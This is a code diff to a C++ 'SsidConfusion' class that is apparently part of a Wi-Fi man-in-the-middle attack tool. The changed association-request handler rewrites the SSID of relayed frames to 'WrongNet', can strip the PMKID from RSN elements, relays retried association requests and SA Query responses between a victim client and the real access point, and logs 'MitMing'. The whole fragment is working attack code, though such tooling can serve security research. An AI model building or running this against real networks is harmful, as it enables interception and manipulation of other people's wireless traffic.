@@ -73,7 +73,17 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &, Dot11 &do
 	if(!dot11.find_pdu<Dot11AssocRequest>() && !dot11.find_pdu<Dot11ReAssocRequest>())
 		return CONTINUE;
 
-	if(client_state.get_state() >= ClientState::Associated) return STOP;
+	auto translated = ensure_radiotap(raw);
+	rewrite_ssid_in_frame(translated, "WrongNet"); //TODO hardcoded
+	if(strip_pmkid_in_assoc) strip_pmkid_from_rsn_ie(translated);
+
+	if(client_state.get_state() >= ClientState::Associated) {
+		// deduplicate L2 retransmissions: Retry bit set = same frame resent, real AP already got it
+		if(dot11.retry()) return STOP;
+		display_traffic(dot11, "Rogue channel", " -- AssocReq retry (relay to real)");
+		send_to_real(translated);
+		return STOP;
+	}
 
 	display_traffic(dot11, "Rogue channel", " -- MitMing (relay to real)");
 	client_state.update_state(ClientState::Associated);
@@ -87,9 +97,6 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &, Dot11 &do
 	synth_auth.status_code(0);
 	send_to_real(synth_auth);
 
-	auto translated = ensure_radiotap(raw);
-	rewrite_ssid_in_frame(translated, "WrongNet"); //TODO hardcoded
-	if(strip_pmkid_in_assoc) strip_pmkid_from_rsn_ie(translated);
 	send_to_real(translated);
 	return STOP;
 }
@@ -117,6 +124,8 @@ void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const 
 	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11, raw))
 	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr2, *pdu, raw))
 
+	#undef SOLVE_OR_CONTINUE
+
 	// SA Query Response from STA -> relay to real AP (transparent, MIC stays valid)
 	if(dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == 13 &&
 	   addr2 == HWAddress<6>(sta.get(SK::mac))) {
@@ -124,8 +133,6 @@ void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const 
 		send_to_real(raw);
 		return;
 	}
-
-#undef SOLVE_OR_CONTINUE
 
 	if(addr2 == sta.get(SK::mac)) {
 		if(dot11->find_pdu<Dot11Beacon>()) return; // client_ack_vif beacon leak
